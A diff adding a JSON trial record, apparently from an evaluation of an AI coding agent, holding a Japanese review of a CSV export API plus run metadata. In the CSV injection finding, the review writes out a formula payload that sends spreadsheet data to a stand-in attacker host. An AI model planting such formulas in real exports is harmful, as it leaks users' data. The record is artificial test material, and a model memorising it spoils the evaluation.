@@ -1,0 +1,44 @@
+{
+  "trial": "W21-ce-review-c3-1",
+  "scenario": "W21",
+  "config": "ce-review",
+  "case": "c3",
+  "rep": 1,
+  "review_md": "# レビュー: タスク一覧の CSV エクスポート（`GET /api/tasks/export`）\n\n対象: `src/app/api/tasks/export/route.ts`、`src/lib/export.ts`、`tests/export.test.ts`\n結論: **マージ前に修正が必要**（高 2 件、中 2 件、低 1 件）。`npm test`（22 件）は通るが、下記 1 の不具合はテストで検出できていない。\n\n## 指摘\n\n### 1. 【高】ダブルクォートをエスケープしていない（`src/lib/export.ts` の `field()`）\n\n- 問題: `field()` は値を `\"${value}\"` で囲むだけで、値の中の `\"` を `\"\"` に置き換えていない。PR の説明は「引用符が含まれても列がずれない」としているが、実際はずれる。\n- 再現: タイトルが `He said \"hi\", ok` のタスクは `\"He said \"hi\", ok\"` と出力される。CSV として読むと引用符がそこで閉じてしまい、列数が増えて期限などが隣の列にずれる。`validateTaskInput` はタイトルの文字種を制限していないので、通常の API 入力でこの状態になる。\n- 直し方: `` `\"${String(value).replaceAll('\"', '\"\"')}\"` `` にする。改行（CRLF 区切りの行内の `\\n`）は引用符で囲んであれば問題ない。\n\n### 2. 【高】`?status=` を型ガードで検証していない（`route.ts` の `GET`）\n\n- 問題: `searchParams.get(\"status\") as TaskStatus | null` は型を偽るだけで検証していない。CLAUDE.md の規約 2（クエリは `isTaskStatus` で検証し、不正な値は「指定なし」）と、PR の説明「不正な値は一覧と同じく指定なし」に反する。\n- 再現: `/api/tasks/export?status=foo` は `listTasks` に `status: \"foo\"` が渡り、`status = 'foo'` に合う行が無いため、**見出しだけの空の CSV** が返る。「指定なし」なら全件が返るはずで、週次報告で空のファイルを黙って貼り付けるおそれがある。`?status=`（空文字）も同様に空になる。\n- 直し方: 画面の一覧と同じ書き方にする。`const raw = ...get(\"status\"); listTasks({ status: isTaskStatus(raw) ? raw : undefined })`。\n\n### 3. 【中】CSV インジェクション（数式の実行）（`src/lib/export.ts`）\n\n- 問題: タイトルは任意のログインユーザーが `POST /api/tasks` で自由に設定できる。`=`、`+`、`-`、`@`、タブ、CR で始まる値は、Excel で開くと数式として評価される。この機能の目的は Excel で開くことなので、実際に影響する。\n- 再現: タイトルが `=HYPERLINK(\"http://evil.example/?\"&A2,\"クリック\")` のタスクを作り、別のユーザーが CSV を Excel で開く。数式が評価され、外部へのリンクやデータ送信、確認ダイアログ経由の実行に使われる。\n- 直し方: 文字列の項目（タイトル・担当者）が `/^[=+\\-@\\t\\r]/` に合うときは、先頭に `'` を付けてからエスケープする。ID と期限は数値・日付なので対象外でよい。この処理は `field()` の近くに関数として置き、単体テストを付ける。\n\n### 4. 【中】テストが PR の主張を検証していない（`tests/export.test.ts`）\n\n- 「escapes quotes and commas in titles」のタイトルは `週次 定例の準備` で、カンマも引用符も含まない。名前と中身が合っておらず、指摘 1 の不具合を見逃している。\n- 直し方: `He said \"hi\", ok` のようなタイトルで、期待値を `\"He said \"\"hi\"\", ok\"` として確認する。改行を含むタイトル、数式で始まるタイトル（指摘 3）、BOM（`CSV_BOM` が `﻿` であること）も追加する。\n- 補足: 1 件目のテストは `lines.length` を `9`（見出し + 7 件 + 末尾の空文字列）としており、シード件数に依存している。シードが変わると関係のない理由で落ちる。`listTasks` の結果の件数から期待値を導く方がよい。\n- 追加: ルートのテストが無い。`?status=` の検証（指摘 2）と未ログイン時 401 を確認するテストが望ましい。ルートに処理を足さないよう、絞り込みの判定は `src/lib/` の関数（例: `parseStatusFilter`）に置くとテストしやすい（規約 1・5）。\n\n### 5. 【低】レスポンスヘッダー（`route.ts`）\n\n- 認証付きで個人・業務データを返すので、`Cache-Control: no-store` を付けておくと、共有プロキシやブラウザにキャッシュが残らない。\n- 必須ではないが、ダウンロード用の API なので付けておくことを勧める。\n\n## 問題なしと判断した点\n\n- 未ログインは `requireApiUser()` で 401 を返し、最初に確認している。\n- SQL は `listTasks` の既存のプレースホルダ経由で、文字列連結は無い。\n- `/api/tasks/export` は静的なセグメントなので、`/api/tasks/[id]` に取られない。\n- BOM は実際に U+FEFF（EF BB BF）で、`Content-Type` の charset も正しい。\n",
+  "review_chars": 2577,
+  "review_committed": true,
+  "transcript": {
+    "cost_usd": 0.3393,
+    "tokens": {
+      "input": 26,
+      "output": 5515,
+      "cache_read": 630346,
+      "cache_creation": 55272
+    },
+    "turns": 14,
+    "permission_denials": [
+      {
+        "tool": "Bash",
+        "input": "{\"command\": \"grep -n 'CSV_BOM = ' src/lib/export.ts | od -c | head -5; grep -c \\\"INSERT\\\\|\\\\[\\\" src/lib/db/seed.ts; npm test 2>&1 | tail -8; cat > /tmp/t.ts <<'EOF'\\nimport { toCsv } from \\\"/tmp/poc-t"
+      },
+      {
+        "tool": "Bash",
+        "input": "{\"command\": \"git add REVIEW.md && git commit -m \\\"$(printf 'docs: CSV エクスポート PR のレビュー結果を追加\\\\n\\\\nCo-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>\\\\nClaude-Session: https://claude.ai/code/sessi"
+      }
+    ],
+    "tool_calls": {
+      "Read": 2,
+      "Bash": 7,
+      "Write": 2
+    },
+    "skills_used": [],
+    "subagents": 0,
+    "subagent_types": {},
+    "questions": 0,
+    "active_seconds": 59,
+    "answer_key_access": [],
+    "isolation_suspects": [],
+    "final_message": "新しく書き写す作業はありませんでした。直前のレビューの指摘は、すでに `REVIEW.md` に書いてコミット済み（6a9f464）です。\n\n- **内容:** 指摘は 5 件で、高 2 件、中 2 件、低 1 件です。削ったものはなく、新しく足したものもありません。\n- **形式:** 各指摘に、見出しで場所（ファイルと関数）と重要度を付け、本文に「問題」（再現する入力と起きること）と「直し方」を書いています。指摘 4 と 5 だけは本文が箇条書きで、「問題」「直し方」のラベルが付いていません。\n- **git の状態:** `REVIEW.md` に未コミットの変更はありません。PR の 3 ファイルは、ステージ済みのままコミットしていません。\n\nコードは直していません。"
+  },
+  "interventions": 0
+}
